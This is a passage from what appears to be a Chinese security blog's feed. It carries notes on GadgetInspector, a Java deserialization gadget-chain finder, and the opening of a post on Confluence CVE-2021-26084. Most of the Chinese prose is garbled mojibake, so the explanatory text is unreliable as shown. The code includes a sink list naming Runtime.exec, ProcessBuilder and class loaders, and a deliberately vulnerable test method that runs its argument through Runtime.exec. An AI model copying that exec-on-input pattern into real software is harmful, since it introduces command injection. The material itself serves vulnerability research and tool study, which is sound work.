class="line">        ...</span><br><span class="line">        TestObject obj1 = <span class="keyword">new</span> TestObject();</span><br><span class="line">        Object obj2 = obj1.childMethod1(arg);</span><br><span class="line">        <span class="keyword">this</span>.obj.childMethod(obj2); </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡è®¾</p><ul><li>arg æ˜¯æ±¡ç‚¹</li><li>passthough å·²ç»ç®—å‡ºTestObject.childMehod1 çš„æ±¡ç‚¹ä¼ æ’­ä¸º0ï¼Œ1</li></ul><p>åœ¨class asm éå†çš„æ—¶å€™</p><ol><li><p>æ˜¯å…ˆé‡åˆ° ParentClass.parentMethod-&gt;obj1.childMehod1ï¼Œæ­¤æ—¶ä¼šå»æ ˆä¸­æŸ¥æ‰¾obj1ã€argï¼Œå…¶ä¸­obj1ä¸æ˜¯æ±¡ç‚¹ï¼Œargæ˜¯æ±¡ç‚¹ï¼Œå¾—åˆ°obj2çš„æ±¡ç‚¹ä¸º1ã€‚å¾—å‡ºç»“è®ºParentClass.parentMethod-&gt;TestObject.childMehod1 çš„ä¼ æ’­å…³ç³»ä¸º1-&gt;1</p></li><li><p>å†é‡åˆ°ParentClass.parentMethod-&gt;obj1.this.obj.childMethod(obj2)ï¼Œæ­¤æ—¶obj2å·²ç»å…¥æ ˆï¼Œæ±¡ç‚¹å€¼ä¸º1ï¼Œé‚£ç®—å¾—returnå€¼ä¸º0ã€1ï¼Œä¸è¿‡å› ä¸ºreturnç»“æœæ²¡æœ‰èµ‹å€¼ï¼Œä¸å…¥æ ˆã€‚å¾—å‡ºç»“è®ºParentClass.parentMethod-MyObject.childMethod çš„ä¼ æ’­å…³ç³»ä¸º0-obj-&gt;0 å’Œ1-&gt;1 </p></li></ol><p>å¯è§passthrough ä¼šå½±å“retæ ˆçš„å€¼ï¼Œä»è€Œå½±å“callgraphçš„ç»“æœã€‚</p><h3 id="2-4-SourceDiscovery"><a href="#2-4-SourceDiscovery" class="headerlink" title="2.4 SourceDiscovery"></a>2.4 SourceDiscovery</h3><p>è¿™ä¸€æ­¥æ˜¯å†…ç½®sourceæºï¼Œä»¥java åŸå£°ååºåˆ—åŒ–ä¸ºä¾‹ï¼Œåœ¨JavaSourceDiscovery#discover ä¸­å®ç°äº†å®šä¹‰ã€‚</p><ul><li>jackson</li><li>javaserial</li><li>xstream</li></ul><p><img src="/images/pasted-268.png" alt="upload successful"></p><p>sources.dat</p><table><thead><tr><th>å­—æ®µ</th><th>Demo</th></tr></thead><tbody><tr><td>ç±»</td><td>java/lang/Enum</td></tr><tr><td>æ–¹æ³•</td><td>readObject</td></tr><tr><td>æ–¹æ³•æè¿°</td><td>(Ljava/io/ObjectInputStream;)V</td></tr><tr><td>æ±¡æŸ“å‚æ•°</td><td>1</td></tr></tbody></table><p>ä»¥javaserial ä¸ºä¾‹ï¼Œåœ¨SimpleSourceDiscoveryå†…ã€‚é™¤äº†sourceåŸï¼Œè¿˜æœ‰å‡ ä¸ªæ¥å£ï¼Œä»¥æ”¯æŒä»¥ä¸Šçš„ä¸åŒååºåˆ—åŒ–æ¡†æ¶ã€‚</p><ul><li>SourceDiscoveryï¼šæºsourceç‚¹</li><li>SerializableDeciderï¼šå†³ç­–</li><li>ImplementationFinderï¼šè§£å†³å¤šæ€é—®é¢˜</li></ul><h3 id="2-5-GadgetChainDiscovery"><a href="#2-5-GadgetChainDiscovery" class="headerlink" title="2.5 GadgetChainDiscovery"></a>2.5 GadgetChainDiscovery</h3><p>è¿™ä¸€æ­¥ä¼šä»source å¼€å§‹éå†ï¼Œå¹¶åœ¨callgraph.datä¸­é€’å½’æŸ¥æ‰¾æ‰€æœ‰å¯ä»¥ç»§ç»­ä¼ é€’æ±¡ç‚¹å‚æ•°çš„å­æ–¹æ³•è°ƒç”¨ï¼Œç›´è‡³é‡åˆ°sinkä¸­çš„æ–¹æ³•ã€‚</p><p><img src="/images/pasted-269.png" alt="upload successful"></p><h4 id="2-5-1-BSF-å¹¿åº¦ä¼˜å…ˆæœç´¢"><a href="#2-5-1-BSF-å¹¿åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="2.5.1 BSF å¹¿åº¦ä¼˜å…ˆæœç´¢"></a>2.5.1 BSF å¹¿åº¦ä¼˜å…ˆæœç´¢</h4><p>å…·ä½“å¯ä»¥çœ‹discoverä¸­çš„é‚£ä¸ªå¾ªç¯</p><ul><li>é€šè¿‡åŠ¨æ€å¯¹methodsToExplore å¢åŠ å…ƒç´ ï¼Œå®ç°é€’å½’æœç´¢</li><li>methodsToExplore addï¼Œépushå¢åŠ å…ƒç´ ï¼Œå› æ­¤æ˜¯å¹¿åº¦ä¼˜å…ˆ</li><li>exploredMethods æ§åˆ¶äº†æ¯ä¸ªMethodèŠ‚ç‚¹+å‚æ•°ä½ç½® åªè¿›è¡Œä¸€æ¬¡æœç´¢</li></ul><p>è¿‡ç¨‹ä¸­ï¼Œç”Ÿæˆäº†æ¥å£å®ç°æ–¹æ³•å…³ç³»è¡¨ methodimpl.data</p><p><img src="/images/pasted-277.png" alt="upload successful"></p><h4 id="2-5-2-sinks"><a href="#2-5-2-sinks" class="headerlink" title="2.5.2 sinks"></a>2.5.2 sinks</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isSink</span><span class="params">(MethodReference.Handle method, <span class="keyword">int</span> argIndex, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileInputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/io/FileOutputStream&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">        &amp;&amp; (method.getName().equals(<span class="string">&quot;newInputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedReader&quot;</span>)</span><br><span class="line">            || method.getName().equals(<span class="string">&quot;newBufferedWriter&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;forName&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if (method.getClassReference().getName().equals(&quot;java/lang/Class&quot;)</span></span><br><span class="line"><span class="comment">            &amp;&amp; method.getName().equals(&quot;getMethod&quot;)) &#123;</span></span><br><span class="line"><span class="comment">        return true;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// If we can invoke an arbitrary method, that&#x27;s probably interesting (though this doesn&#x27;t assert that we</span></span><br><span class="line">    <span class="comment">// can control its arguments). Conversely, if we can control the arguments to an invocation but not what</span></span><br><span class="line">    <span class="comment">// method is being invoked, we don&#x27;t mark that as interesting.</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/reflect/Method&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invoke&quot;</span>) &amp;&amp; argIndex == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URLClassLoader&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newInstance&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/System&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Shutdown&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/Runtime&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/nio/file/Files&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;newOutputStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/lang/ProcessBuilder&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/ClassLoader&quot;</span>))</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;java/net/URL&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;openStream&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/codehaus/groovy/runtime/InvokerHelper&quot;</span>)</span><br><span class="line">            &amp;&amp; method.getName().equals(<span class="string">&quot;invokeMethod&quot;</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/MetaClass&quot;</span>))</span><br><span class="line">            &amp;&amp; Arrays.asList(<span class="string">&quot;invokeMethod&quot;</span>, <span class="string">&quot;invokeConstructor&quot;</span>, <span class="string">&quot;invokeStaticMethod&quot;</span>).contains(method.getName())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This jython-specific sink effectively results in RCE</span></span><br><span class="line">    <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">&quot;org/python/core/PyCode&quot;</span>) &amp;&amp; method.getName().equals(<span class="string">&quot;call&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-3-Demoæµç¨‹"><a href="#2-5-3-Demoæµç¨‹" class="headerlink" title="2.5.3 Demoæµç¨‹"></a>2.5.3 Demoæµç¨‹</h4><p>è¿˜æ˜¯å€Ÿç”¨Longofoå¸ˆå‚…çš„å›¾æ›´ç›´è§‚<br><img src="/images/pasted-271.png" alt="upload successful"></p><ol><li>ä»sourceå‡ºå‘ï¼Œsource thiså¯æ§ï¼Œä¹Ÿå³taintArgï¼š0</li><li>callgraphä¸­ï¼Œå–å‡ºsource-method1 å‚æ•°æ±¡æŸ“å¯¹åº”å…³ç³»0-&gt;0ï¼Œé‚£ä¹ˆmethod1 çš„arg0è¢«æ±¡æŸ“ï¼Œä¹Ÿå³taintArgï¼š0</li><li>callgraphä¸­ï¼Œå–å‡ºmethod1-method5 å‚æ•°æ±¡æŸ“å¯¹åº”å…³ç³»0-&gt;2ï¼Œé‚£ä¹ˆmethod5çš„taintArgï¼š2</li><li>callgraphä¸­ï¼Œå–å‡ºmethod5-sink å‚æ•°æ±¡æŸ“å¯¹åº”å…³ç³»2-&gt;2ï¼Œé‚£ä¹ˆsinkçš„taintArgï¼š2ï¼Œç¬¦åˆgadgetï¼Œå®Œæˆã€‚</li></ol><h2 id="0x03-Pratise"><a href="#0x03-Pratise" class="headerlink" title="0x03 Pratise"></a>0x03 Pratise</h2><p>Longofoå¸ˆå‚…æœ‰æ ·ä¾‹ï¼ŒåŠ äº†äº›è‡ªå·±çš„æµ‹è¯•ä»£ç ï¼Œä¼ åˆ°äº†Gitä¸Šæ–¹ä¾¿ç‚¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yangbh/GINote.git</span><br><span class="line"><span class="built_in">cd</span> GINote</span><br><span class="line">mvn package</span><br><span class="line">java -Xmx2G -jar build/libs/gadget-inspector-all.jar GILearn2-1.0-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-273.png" alt="upload successful"></p><h2 id="0x04-æ€è€ƒ"><a href="#0x04-æ€è€ƒ" class="headerlink" title="0x04 æ€è€ƒ"></a>0x04 æ€è€ƒ</h2><h3 id="4-1-callgraph-å¯¹é™æ€æ–¹æ³•çš„å¤„ç†"><a href="#4-1-callgraph-å¯¹é™æ€æ–¹æ³•çš„å¤„ç†" class="headerlink" title="4.1 callgraph å¯¹é™æ€æ–¹æ³•çš„å¤„ç†"></a>4.1 callgraph å¯¹é™æ€æ–¹æ³•çš„å¤„ç†</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invokeCall</span><span class="params">(Object arg)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Runtime.getRuntime().exec((String)arg);</span><br><span class="line"><span class="comment">//        return Runtime.getRuntime().exec(String.ValueOf(arg));</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>su18å¸ˆå‚…çš„æ–‡ç« æ›´æ·±åˆ»ï¼Œè¿™é‡Œå­¦å®Œå†æ¥å†™å§ã€‚</p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>åªèƒ½ç®—æ˜¯å­¦ä¹ GIçš„ç¬”è®°ï¼Œè‡³å°‘å¤§è‡´ç†æ¸…äº†GIçš„è¿è¡Œé€»è¾‘ï¼ˆå¯¹ASMè¿˜ä¸æ˜¯ç‰¹åˆ«äº†è§£ï¼‰ï¼Œè¿‡ç¨‹ä¸­ä¹Ÿå‘ç°å¸ˆå‚…ä»¬æå‡ºçš„ä¸€äº›bugå’Œæ”¹è¿›ç‚¹ã€‚</p><p>å¸ˆå‚…ä»¬å…³äºASMé‚£å—éƒ½è®²çš„å¾ˆæ™¦æ¶©ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©åˆ°åŒæ ·å¯¹æ­¤æœ‰å›°æƒ‘çš„äººã€‚</p><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ul><li>[1] <a href="https://su18.org/post/gadgetor/#0x05-gadgetor">é«˜æ•ˆæŒ–æ˜ååºåˆ—åŒ–æ¼æ´â€”â€”GadgetInspectoræ”¹é€ (by:su18)</a></li><li>[2] <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf (by:ç½‘é£ Platform Security Team)</a></li><li>[3] <a href="https://github.com/kezibei/Urldns">https://github.com/kezibei/Urldns(by:ç‚å­—è¾ˆ)</a></li><li>[4] <a href="https://xz.aliyun.com/t/7058">javaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æ(by:threedr3am)</a></li><li>[5] <a href="https://paper.seebug.org/1034/">Java ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥(by:Longofo)</a></li><li>[6] <a href="https://fynch3r.github.io/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">GadgetInspectoræºç åˆ†æ(by:fynch3r)</a></li><li>[7] <a href="https://github.com/knownsec/KCon/raw/master/2022/tabby%20java%20code%20review%20like%20a%20pro%E3%80%90KCon2022%E3%80%91.pdf">KCON: tabby java code review like a pro (by:wh1t3p1g)</a></li><li>[8] <a href="http://tttang.com/archive/1696/">tabbyåŸç†åˆ†æ(by:cokeBeer)</a></li><li>[9] <a href="https://tttang.com/archive/1647/">ä½¿ç”¨tabbyåˆ†æSpring Data MongoDB SpELæ¼æ´(by:Xiaopan233)</a></li><li>[10] <a href="https://www.anquanke.com/post/id/234537">å¦‚ä½•é«˜æ•ˆçš„æŒ–æ˜Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Ÿ(by:wh1t3p1g)</a></li><li>[11] <a href="https://www.anquanke.com/post/id/251814">å¦‚ä½•é«˜æ•ˆåœ°æ¡æ¼ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Ÿ(by:wh1t3p1g)</a></li><li>[12] <a href="https://www.kingkk.com/2020/01/gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">gadgetinspectoræºç æµ…æ(by:kingkk)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å§‹å•ƒéª¨å¤´äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x01-èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01 èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01 èƒŒæ™¯çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;ä¸äº†è§£ç®—æ³•åŸç†åŸºç¡€ä¸Šï¼Œå»ç›´æ¥å•ƒGIæºç ï¼ŒçœŸçš„æ˜¯ä¸€ä»¶å¾ˆå›°éš¾çš„äº‹æƒ…ï¼Œéš¾å¾—æœ‰å¸ˆå‚…ä»¬çš„ç»éªŒæ€»ç»“ï¼Œç«™åœ¨å¸ˆå‚…ä»¬çš„è‚©è†€ä¸Šè®°å½•ä¸‹GIçš„å­¦ä¹ å¿ƒå¾—ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æ—¶é—´çº¿&quot;&gt;&lt;a href=&quot;#æ—¶é—´çº¿&quot; class=&quot;headerlink&quot; title=&quot;æ—¶é—´çº¿&quot;&gt;&lt;/a&gt;æ—¶é—´çº¿&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;2018å¹´Black Hatå…¬å¸ƒ&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf&quot;&gt;GadgetInspector&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2019å¹´Longofoå¸ˆå‚…&lt;a href=&quot;https://paper.seebug.org/1034/#step2-passthrough_1&quot;&gt;ã€ŠJava ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥ã€‹&lt;/a&gt;ï¼Œè¯¦ç»†è·Ÿè¸ªäº†é™¤ASMä¹‹å¤–çš„çŸ¥è¯†ç‚¹ï¼Œé‡ç‚¹æ˜¯é€†æ‹“æ‰‘æ’åº&lt;/li&gt;
&lt;li&gt;2020å¹´threedr3am&lt;a href=&quot;https://xz.aliyun.com/t/7058#toc-4&quot;&gt;ã€Šjavaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æã€‹&lt;/a&gt;ï¼Œé‡ç‚¹åˆ†æäº†Longofoå¸ˆå‚…æœªæåˆ°çš„ASM&lt;/li&gt;
&lt;li&gt;2022å¹´su18å¸ˆå‚…&lt;a href=&quot;https://su18.org/post/gadgetor/&quot;&gt;ã€Šé«˜æ•ˆæŒ–æ˜ååºåˆ—åŒ–æ¼æ´â€”â€”GadgetInspectoræ”¹é€ ã€‹&lt;/a&gt;ï¼Œæåˆ°äº†GIçš„ä¸è¶³ä»¥åŠæ”¹è¿›æ€è·¯&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„è®¸å¤šå¸ˆå‚…å…³äºGIçš„æ–‡ç« ï¼Œè¿™é‡Œæ²¡æœ‰æåˆ°ï¼Œä¸èµ˜è¿°ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="ç¨‹åºåˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="GadgetInspector" scheme="http://m0d9.me/tags/GadgetInspector/"/>
    
    <category term="æ±¡ç‚¹åˆ†æ" scheme="http://m0d9.me/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
    <category term="é™æ€åˆ†æ" scheme="http://m0d9.me/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Confluence CVE-2021-26084 Velocityæ¨¡æ¿äºŒæ¬¡æ³¨å…¥</title>
    <link href="http://m0d9.me/2022/07/20/Struts2%E7%B3%BB%E5%88%97%E5%9B%9B%EF%BC%9AConfluence%20CVE-2021-26084/"/>
    <id>http://m0d9.me/2022/07/20/Struts2%E7%B3%BB%E5%88%97%E5%9B%9B%EF%BC%9AConfluence%20CVE-2021-26084/</id>
    <published>2022-07-20T08:27:00.000Z</published>
    <updated>2022-09-14T05:32:12.113Z</updated>
    
    <content type="html"><![CDATA[<p>Confluence CVE-2021-26084 æ˜¯å‰å°èƒ½å¤Ÿè§¦å‘çš„RCEï¼ŒCVSS9.8ï¼Œå±å®³ä¸å°ã€‚æ¼æ´åŸå› æ˜¯å› ä¸ºVelocity å†™å¾—æœ‰é—®é¢˜å¯¼è‡´å¯ä»¥Ognlæ³¨å…¥ï¼Œè¿™ç§æ¨¡æ¿é—®é¢˜å¯¼è‡´çš„æ¼æ´æŒºå°‘è§ï¼Œä½†æ˜¯å¾ˆé€‚ç”¨ï¼Œå€¼å¾—åˆ†æã€‚</p><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h2><p>PğŸ®çš„Vulhub æœ‰é•œåƒï¼Œå‚è€ƒã€2ã€‘ï¼ŒåŒæ ·è°ƒè¯•æ¥å£æ²¡æœ‰å¼€å‡ºæ¥ï¼Œå¯ä»¥å‚è€ƒä¹‹å‰çš„ã€ŠConfluence CVE-2022-26134 OGNL åˆ†æã€‹ä¸€æ–‡æ­å»ºç¯å¢ƒã€‚</p><ol><li><p>æ–°å»ºDockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.4</span>.<span class="number">10</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;67 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><p>å‚è€ƒã€1ã€‘ä¸­Lotsoå¸ˆå‚…ç»™çš„å‡ ä¸ªpatch</p><ol><li><p>confluence/users/user-dark-features.vm</p><p><code>value=&#39;$!action.featureKey&#39; =&gt; value=featureKey</code></p><p>7.12.4ç‰ˆæœ¬å·²ç»å¯¹è¯¥æ–‡ä»¶è¿›è¡Œäº†æ›´æ”¹</p></li><li><p>confluence/login.vm</p><p><code>value=&#39;$!action.token&#39; =&gt; value=token</code></p><p>7.12.4ç‰ˆæœ¬å·²ç»å¯¹è¯¥æ–‡ä»¶è¿›è¡Œäº†æ›´æ”¹</p></li><li><p>confluence/pages/createpage-entervariables.vm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 